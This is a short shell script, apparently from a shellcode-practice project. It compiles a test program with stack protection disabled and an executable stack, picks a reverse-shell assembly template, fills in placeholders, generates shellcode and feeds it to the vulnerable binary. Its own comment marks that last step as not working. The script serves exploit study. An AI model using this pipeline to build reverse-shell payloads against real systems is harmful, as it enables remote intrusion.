# /bin/sh

if [ -n "$1" ]; then
    echo "Filename: $1"
else
    echo "Enter destination filename. Exit."
    exit
fi

# Prepare target for testing 
gcc -Wno-implicit -m32 -fno-stack-protector -z execstack test_vuln.c -o _test_vuln.out

# Denerating shellcode
# cp asm_examples/openfile.asm _shellcode.asm
# cp asm_examples/string.asm _shellcode.asm
# cp asm_examples/sh.asm _shellcode.asm
cp asm_examples/rshell.asm _shellcode.asm

#  "POP RBX" for x64
# sed -i "s/<POP_ARCH>/pop     ebx/g" _shellcode.asm
sed -i "s/<FILENAME>/${1}/g" _shellcode.asm
sed -i "s/<STRING>/${1}/g" _shellcode.asm
SHELL=`python3 gen_shell.py _shellcode.asm 32`

echo ${SHELL}

# Test shellcode (TODO: not working)
./_test_vuln.out ${SHELL}

# Cleanup
# rm _*